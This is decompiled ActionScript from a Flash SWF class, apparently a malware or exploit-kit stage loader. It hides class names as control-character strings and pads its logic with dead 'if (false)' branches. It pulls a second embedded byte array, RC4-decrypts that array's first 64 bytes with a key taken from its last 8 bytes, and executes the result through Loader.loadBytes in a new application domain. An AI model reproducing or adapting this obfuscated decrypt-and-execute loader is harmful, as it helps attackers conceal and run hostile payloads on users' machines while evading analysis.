package 
{
    import flash.display.*;
    import flash.system.*;
    import flash.utils.*;

    public class lb extends MovieClip
    {
        public var ba1:ByteArray;
        public var loader1:Loader;
        public var loaderContext1:LoaderContext;
        public var loader2:Loader;
        public var loaderContext2:LoaderContext;
        public var ba2:ByteArray;
        public var ba3:ByteArray;
        public var int1:int = 64;
        public var int2:int;
        public var int3:int;
        public var int4:int;
        public var ba4:ByteArray;
        public var int5:int;
        public var int6:int;
        public var int7:int;

        public function lb()
        {
            if (false)
            {
                if (false)
                {
                }
            }
            //addFrameScript(0, this.initSWF);
            //addFrameScript(1, this.func2);
            ;
            if (false)
            {
            }
            return;
        }// end function

        public function initSWF() : void
        {
            ;
            if (false)
            {
            }
            stop();
            this.func1();
            ;
            if (false)
            {
            }
            return;
        }// end function

        public function func1() : void
        {
            if (false)
            {
            }
            this.ba1 = ByteArray(new (getDefinitionByName("\r\t\x18\t\r\r\x18\x1b\x0b") as Class)());
            this.ba1.endian = "littleEndian";
            this.ba1.position = 0;
            this.loader1 = new Loader();
            this.addChildAt(this.loader1, 0);
            this.loaderContext1 = new LoaderContext();
            this.loaderContext1.applicationDomain = new ApplicationDomain();
            this.loader1.loadBytes(this.ba1, this.loaderContext1);
            if (false)
            {
            }
            return;
        }// end function

        public function func2() : void
        {
            if (false)
            {
                if (false)
                {
                }
            }
            stop();
            this.ba2 = ByteArray(new (getDefinitionByName("\x18\x17\x1b\r\x1b\t\x18\x1b\x1b\r") as Class)());
            this.ba2.endian = "littleEndian";
            this.ba2.position = 0;
            this.ba3 = new ByteArray();
            this.ba3.writeBytes(this.ba2, this.ba2.length - 8, 8);
            this.func3();
            this.loader2 = new Loader();
            this.removeChildAt(0);
            this.addChildAt(this.loader2, 0);
            this.loaderContext2 = new LoaderContext();
            this.loaderContext2.applicationDomain = new ApplicationDomain();
            this.loader2.loadBytes(this.ba2, this.loaderContext2);
            if (false)
            {
            }
            return;
        }// end function

        public function func3() : void
        {
            if (false)
            {
                if (false)
                {
                }
            }
            this.int2 = this.ba2.length < this.int1 ? (this.ba2.length) : (this.int1);
            this.int3 = 0;
            this.int4 = 0;
            this.ba4 = new ByteArray();
            this.int5 = 0;
            while (this.int5 < 256)
            {
                
                this.ba4[this.int5] = this.int5;
                var _loc_1:* = this;
                var _loc_2:* = this.int5 + 1;
                _loc_1.int5 = _loc_2;
            }
            this.int6 = 0;
            this.int5 = 0;
            while (this.int5 < 256)
            {
                
                this.int6 = this.int6 + this.ba4[this.int5] + this.ba3[this.int5 % this.ba3.length] & 255;
                this.int7 = this.ba4[this.int5];
                this.ba4[this.int5] = this.ba4[this.int6];
                this.ba4[this.int6] = this.int7;
                var _loc_1:* = this;
                var _loc_2:* = this.int5 + 1;
                _loc_1.int5 = _loc_2;
            }
            this.int5 = 0;
            while (this.int5 < this.int2)
            {
                
                this.int3 = (this.int3 + 1) & 255;
                this.int4 = this.int4 + this.ba4[this.int3] & 255;
                this.int6 = this.ba4[this.int3];
                this.ba4[this.int3] = this.ba4[this.int4];
                this.ba4[this.int4] = this.int6;
                this.ba2[this.int5] = this.ba2[this.int5] ^ this.ba4[this.int6 + this.ba4[this.int3] & 255];
                var _loc_1:* = this;
                var _loc_2:* = this.int5 + 1;
                _loc_1.int5 = _loc_2;
            }
            if (false)
            {
            }
            return;
        }// end function

        ;
        ;
        ;
        if (false)
        {
        }
    }
}
